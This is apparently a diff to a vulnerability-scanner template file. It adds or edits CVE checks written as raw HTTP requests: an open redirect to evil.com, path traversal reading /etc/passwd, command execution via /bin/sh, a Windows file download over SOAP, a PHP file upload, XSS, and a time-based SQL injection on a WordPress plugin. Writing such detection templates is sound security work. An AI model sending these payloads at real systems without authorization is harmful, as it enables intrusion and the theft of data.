@@ -7344,15 +7344,15 @@
     {
       "id": "CVE-2018-17422",
       "info": {
-        "name": "dotCMS <5.0.2 - Open Redirect",
+        "name": "DotCMS < 5.0.2 - Open Redirect",
         "severity": "medium"
       },
       "requests": [
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/html/common/forward_js.jsp?FORWARD_URL=http://www.interact.sh",
-            "{{BaseURL}}/html/portlet/ext/common/page_preview_popup.jsp?hostname=interact.sh"
+            "{{BaseURL}}/html/common/forward_js.jsp?FORWARD_URL=http://evil.com",
+            "{{BaseURL}}/html/portlet/ext/common/page_preview_popup.jsp?hostname=evil.com"
           ]
         }
       ]
@@ -12427,9 +12427,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -18450,6 +18450,7 @@
         {
           "raw": [
             "GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1\nHost: {{Hostname}}\n",
             "POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\necho Content-Type: text/plain; echo; {{cmd}}\n"
           ]
         }
@@ -20417,6 +20418,20 @@
           "raw": [
             "POST /wp-admin/admin.php?page=html2wp-settings HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 253\nContent-Type: multipart/form-data; boundary=---------------------------7816508136577551742878603990\nConnection: close\n\n-----------------------------7816508136577551742878603990\nContent-Disposition: form-data; name=\"local_importing[]\"; filename=\"{{randstr}}.php\"\nContent-Type: text/html\n\n<?php\n\necho \"File Upload success\";\n\n-----------------------------7816508136577551742878603990--\n",
             "GET /wp-content/uploads/html2wp/{{randstr}}.php HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-1595",
+      "info": {
+        "name": "HC Custom WP-Admin URL - 1.4 - Unauthenticated Secret URL Disclosure",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "HEAD /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nCookie: valid_login_slug=1\n"
           ]
         }
       ]
@@ -23131,6 +23146,20 @@
         {
           "raw": [
             "GET /kfm/index.php/'<script>alert(document.domain);</script> HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-4050",
+      "info": {
+        "name": "JoomSport < 5.2.8 - Unauthenticated SQLi",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 15s\nPOST /wp-admin/admin-ajax.php?action=joomsport_md_load HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nmdId=1&shattr={\"id\":\"1+AND+(SELECT+1+FROM(SELECT+SLEEP(4))aaaa);--+-\"}\n"
           ]
         }
       ]
